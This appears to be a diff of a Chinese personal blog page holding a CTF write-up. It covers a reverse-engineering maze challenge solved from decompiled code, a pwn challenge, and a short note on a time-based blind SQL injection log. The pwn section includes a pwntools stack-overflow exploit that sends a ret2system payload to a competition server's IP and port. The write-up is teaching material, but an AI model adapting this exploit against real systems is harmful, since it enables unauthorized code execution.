@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta name="generator" content="Hexo 3.9.0">
+<head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
@@ -45,7 +45,7 @@
 <div class="nav" id="nav">
     <div class="avatar-name">
         <div class="avatar radius">
-            <img src="/img/avatar.jpg" />
+            <img src="/img/avatar.jpg">
         </div>
         <div class="name">
             <i>一筐萝卜</i>
@@ -53,25 +53,25 @@
     </div>
     <div class="contents" id="nav-content">
         <ul>
-            <li >
+            <li>
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
                     <span>HOME</span>
                 </a>
             </li>
-            <li >
+            <li>
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
                     <span>TAGS</span>
                 </a>
             </li>
-            <li >
+            <li>
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
                     <span>ARCHIVES</span>
                 </a>
             </li>
-            <li >
+            <li>
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
                     <span>ABOUT</span>
@@ -99,7 +99,7 @@
     <div class="search-container">
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input"/>
+            <input id="search-input">
             <span id="begin-search">search</span>
         </div>
         <div class="search-result-container" id="search-result-container">
@@ -135,7 +135,7 @@
         </span>
         <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
 </span>
-</span>
+
     </div>
     <div class="post-content no-indent">
         <p>这两天考试考的我有点烦！</p>
@@ -146,36 +146,27 @@
 <h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>64位window可执行程序，无壳，载入IDA中，通过关键字符串来定位关键代码</p>
 <p>经过分析f5出来的代码发现，这是一个迷宫题</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7 = <span class="number">26</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="string">"%d"</span>, v6);</span><br><span class="line">    --dword_140005034;</span><br><span class="line">    ++v6;</span><br><span class="line">    --v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 );</span><br></pre></td></tr></table></figure>
-
 <p>程序限制输入的长度是26位</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( DstBuf[v9] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//上</span></span><br><span class="line">    --v1;</span><br><span class="line">    v12 -= <span class="number">7</span>i64;</span><br><span class="line">    --v11;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//下</span></span><br><span class="line">    ++v1;</span><br><span class="line">    v12 += <span class="number">7</span>i64;</span><br><span class="line">    ++v11;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//左</span></span><br><span class="line">    --v2;</span><br><span class="line">    --v8;</span><br><span class="line">    --v10;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">if</span> ( DstBuf[v9] != <span class="number">4</span> )<span class="comment">//右</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v8;</span><br><span class="line">    ++v10;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>这个switch语句控制走的方向</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)&amp;<span class="built_in">map</span>[<span class="number">4</span> * (v12 + v8)] == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>((__int64)<span class="string">"You lost"</span>, v10, v11, v8);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
 <p>控制走的路径上不能等于1</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v11 &gt; <span class="number">6</span> || v10 &gt; <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"illegal access"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
 <p>控制走的极限不能超过6，也就是说地图是一个7*7的矩阵</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)&amp;<span class="built_in">map</span>[<span class="number">4</span> * (v2 + <span class="number">7</span>i64 * v1)] != <span class="number">99</span> )</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br></pre></td></tr></table></figure>
-
 <p>这是限制终点的数是99</p>
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">8 </span>	<span class="number">1</span> 	<span class="number">14</span> 	<span class="number">11</span> 	<span class="number">7</span> 	<span class="number">16</span> 	<span class="number">1</span> </span><br><span class="line"><span class="symbol">11 </span>	<span class="number">15</span> 	<span class="number">15</span> 	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">9</span> 	<span class="number">1</span> </span><br><span class="line"><span class="symbol">1 </span>	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">11</span> 	<span class="number">1</span> </span><br><span class="line"><span class="symbol">12 </span>	<span class="number">12</span> 	<span class="number">8</span> 	<span class="number">14</span> 	<span class="number">1</span> 	<span class="number">8</span> 	<span class="number">1</span> </span><br><span class="line"><span class="symbol">8 </span>	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">12</span> 	<span class="number">9</span> 	<span class="number">14</span> 	<span class="number">1</span> </span><br><span class="line"><span class="symbol">13 </span>	<span class="number">8</span> 	<span class="number">11</span> 	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">1</span> 	<span class="number">1</span> </span><br><span class="line"><span class="symbol">1 </span>	<span class="number">1</span> 	<span class="number">9</span> 	<span class="number">10</span> 	<span class="number">9</span> 	<span class="number">9</span> 	<span class="number">99</span></span><br></pre></td></tr></table></figure>
-
 <p>这是map，也就是说，是从左上角走到右上角</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>((__int64)<span class="string">"flag&#123;"</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( DstBuf[v0] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v13 = <span class="number">82</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v13 = <span class="number">35</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v13 = <span class="number">90</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v13 = <span class="number">70</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(v13);</span><br><span class="line">LABEL_37:</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">26</span> );</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br></pre></td></tr></table></figure>
-
 <p>这是最后生成flag，把路径进行字符串替换</p>
 <p>最后得到flag：#FFRFFF####ZZRZZZ##FF#FFFF</p>
-<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单的栈溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="comment">#101.71.29.5:10001</span></span><br><span class="line">ip = <span class="string">"101.71.29.5"</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line">r = remote(ip,port)</span><br><span class="line">file = ELF(<span class="string">"./magicc"</span>)</span><br><span class="line"><span class="keyword">print</span> file.plt</span><br><span class="line">offset = <span class="number">0x12</span>+<span class="number">4</span></span><br><span class="line">r.recvuntil(<span class="string">"4.--&gt;Slytherin\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"4"</span>)</span><br><span class="line">r.recvline(<span class="string">"You are one step short of success\n"</span>)</span><br><span class="line">system_addr = file.plt[<span class="string">'system'</span>]</span><br><span class="line">command_addr = <span class="number">0x8048847</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*offset+p32(system_addr)+p32(<span class="number">0x804862E</span>)+p32(command_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"4.--&gt;Slytherin\n"</span>)</span><br></pre></td></tr></table></figure>
-
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单的栈溢出<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="comment">#101.71.29.5:10001</span></span><br><span class="line">ip = <span class="string">"101.71.29.5"</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line">r = remote(ip,port)</span><br><span class="line">file = ELF(<span class="string">"./magicc"</span>)</span><br><span class="line"><span class="keyword">print</span> file.plt</span><br><span class="line">offset = <span class="number">0x12</span>+<span class="number">4</span></span><br><span class="line">r.recvuntil(<span class="string">"4.--&gt;Slytherin\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"4"</span>)</span><br><span class="line">r.recvline(<span class="string">"You are one step short of success\n"</span>)</span><br><span class="line">system_addr = file.plt[<span class="string">'system'</span>]</span><br><span class="line">command_addr = <span class="number">0x8048847</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*offset+p32(system_addr)+p32(<span class="number">0x804862E</span>)+p32(command_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"4.--&gt;Slytherin\n"</span>)</span><br></pre></td></tr></table></figure></p>
 <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>经过分析发现攻击者是通过时间盲注来获取flag</p>
 <p>我们可以通过时间差来得到flag</p>
 <p>ps：我没写脚本跑，眼快瞪瞎了！！！</p>
 
         
-        <br />
+        <br>
         <div id="comment-container">
         </div>
         <div id="disqus_thread"></div>
@@ -207,7 +198,7 @@
     
     <p>
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
         本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </p>
 </footer>
